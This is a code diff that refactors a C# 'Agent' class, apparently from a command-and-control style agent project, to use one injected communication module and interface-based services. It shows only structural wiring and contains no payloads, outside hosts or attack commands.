@@ -1,4 +1,5 @@
 ﻿using Agent.Commands;
+using Agent.Communication;
 using Agent.Service;
 using System;
 using System.Collections.Generic;
@@ -12,11 +13,10 @@ namespace Agent.Models
 {
     public class Agent
     {
-        public HttpCommModule HttpCommunicator { get; set; }
-        public PipeCommModule PipeCommunicator { get; set; }
-        private MessageService _messageService;
-        private FileService _fileService;
-        private ProxyService _proxyService;
+        public CommModule Communicator { get; set; }
+        private IMessageService _messageService;
+        private IFileService _fileService;
+        private IProxyService _proxyService;
         private AgentMetadata _metadata;
 
         private CancellationTokenSource _tokenSource = new CancellationTokenSource();
@@ -56,21 +56,21 @@ namespace Agent.Models
             return count;
         }
 
-        public Agent(AgentMetadata metadata)
+        public Agent(AgentMetadata metadata, CommModule commModule)
         {
             _metadata = metadata;
-            _messageService = new MessageService(metadata);
-            _fileService = new FileService();
-            _proxyService = new ProxyService();
+            this.Communicator = commModule;
 
-            this.HttpCommunicator = new HttpCommModule(_messageService, _fileService, _proxyService);
-            this.PipeCommunicator = new PipeCommModule(_messageService, _fileService, _proxyService);
+            this._messageService = ServiceProvider.GetService<IMessageService>();
+            this._fileService = ServiceProvider.GetService<IFileService>();
+            this._proxyService = ServiceProvider.GetService<IProxyService>();
 
             LoadCoreAgentCommands();
         }
 
         public void Start()
         {
+            this.Communicator.Start();
             while (!_tokenSource.IsCancellationRequested)
             {
                 var messages = this._messageService.GetMessageTasksForAgent(this._metadata.Id);
@@ -95,6 +95,7 @@ namespace Agent.Models
         public void Stop()
         {
             this._tokenSource.Cancel();
+            this.Communicator.Stop();
         }
 
         public void HandleTask(IEnumerable<AgentTask> tasks)
